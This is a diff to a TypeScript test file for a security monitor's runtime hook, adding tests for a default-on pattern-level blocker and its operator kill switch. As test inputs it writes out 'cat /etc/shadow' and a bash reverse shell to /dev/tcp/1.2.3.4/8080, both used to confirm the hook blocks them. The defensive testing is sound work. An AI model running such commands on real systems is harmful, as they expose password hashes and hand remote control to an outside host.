@@ -29,6 +29,7 @@ const ENV_KEYS = [
   'OPENCLAW_MONITOR_LOG_PATH',
   'OPENCLAW_RUNTIME_ENFORCE',
   'OPENCLAW_RUNTIME_BLOCKED_FLAGS',
+  'OPENCLAW_RUNTIME_BLOCK_PATTERNS',
   'OPENCLAW_NETWORK_ENFORCE',
   'OPENCLAW_NETWORK_HOOK_ENABLED',
 ] as const;
@@ -234,6 +235,77 @@ describe('runtime hook 环境传播', () => {
       expect(runtimeHook.shouldBlock({ risk_flags: ['reverse_shell'] })).toBeUndefined();
       const pin = (globalThis as Record<string, unknown>)[PIN_KEY] as () => Record<string, string | undefined>;
       expect(pin().OPENCLAW_RUNTIME_ENFORCE).toBeUndefined();
+    });
+  });
+
+  // ⭐ #469-A：runtime hook 的**模式级 Tier-1 阻断**（读 /etc/shadow、
+  // 读 ~/.aws/credentials …）的开关与传播。
+  //
+  // 这是一档**新增的阻断能力** ⇒ 必须有操作员一键关闭的口子（FP 治理红线：
+  // 「block 必须高准确率」⇒ 误报时只能改包升级是不可接受的）。
+  //
+  // 语义锁定三件事：
+  //   1. 默认**开启**（配置缺省 = 开启）；
+  //   2. 关闭时 env 与 pin **同值**（'0'）⇒ 网关进程与子进程判定一致；
+  //   3. 开启时**不钉该键、不删 env** ⇒ 操作员在网关环境里手工设的
+  //      OPENCLAW_RUNTIME_BLOCK_PATTERNS=0（应急逃生阀）继续有效。
+  describe('#469-A 模式级 Tier-1 阻断开关', () => {
+    const PIN_KEY = '__OPENCLAW_SECURITY_HOOK_ENV__';
+    // eslint-disable-next-line @typescript-eslint/no-var-requires
+    const runtimeHook = require(resolve(process.cwd(), 'hooks/runtime.js')) as {
+      shouldBlock: (event: { risk_flags?: string[]; command_line?: string }, options?: { command_line?: string }) => string | undefined;
+    };
+
+    async function initWithRuntimeHooks(runtimeHooksExtra: Record<string, unknown>) {
+      store = new SecurityMonitorStore();
+      await store.initialize(
+        baseConfig({
+          application: {
+            enabled: true,
+            runtimeHooks: {
+              enabled: true,
+              logPath: join(tmpDir, 'security-events-runtime.jsonl'),
+              ...runtimeHooksExtra,
+            },
+          },
+          intervention: { enabled: true, mode: 'enforce', policyPath, reloadIntervalMs: 0 },
+        })
+      );
+    }
+
+    const SHADOW_CMD = 'cat /etc/shadow';
+
+    it('默认开启：模式级阻断生效，env 未被写值', async () => {
+      await initWithRuntimeHooks({});
+      expect(process.env.OPENCLAW_RUNTIME_BLOCK_PATTERNS).toBeUndefined();
+      expect(
+        runtimeHook.shouldBlock({ risk_flags: [] }, { command_line: SHADOW_CMD })
+      ).toContain('Tier-1');
+    });
+
+    it('显式 blockPatternsEnabled=false：模式级关闭，flag 级不受影响', async () => {
+      await initWithRuntimeHooks({ blockPatternsEnabled: false });
+      expect(process.env.OPENCLAW_RUNTIME_BLOCK_PATTERNS).toBe('0');
+      const pin = (globalThis as Record<string, unknown>)[PIN_KEY] as () => Record<string, string | undefined>;
+      expect(pin().OPENCLAW_RUNTIME_BLOCK_PATTERNS).toBe('0');
+
+      expect(
+        runtimeHook.shouldBlock({ risk_flags: [] }, { command_line: SHADOW_CMD })
+      ).toBeUndefined();
+      expect(
+        runtimeHook.shouldBlock({ risk_flags: ['reverse_shell'] }, { command_line: 'bash -i >& /dev/tcp/1.2.3.4/8080 0>&1' })
+      ).toContain('risk flag: reverse_shell');
+    });
+
+    it('开启时不覆盖操作员手工设的应急逃生阀（env 保留、pin 不钉该键）', async () => {
+      process.env.OPENCLAW_RUNTIME_BLOCK_PATTERNS = '0';
+      await initWithRuntimeHooks({});
+      expect(process.env.OPENCLAW_RUNTIME_BLOCK_PATTERNS).toBe('0');
+      const pin = (globalThis as Record<string, unknown>)[PIN_KEY] as () => Record<string, string | undefined>;
+      expect(Object.prototype.hasOwnProperty.call(pin(), 'OPENCLAW_RUNTIME_BLOCK_PATTERNS')).toBe(false);
+      expect(
+        runtimeHook.shouldBlock({ risk_flags: [] }, { command_line: SHADOW_CMD })
+      ).toBeUndefined();
     });
   });
 });
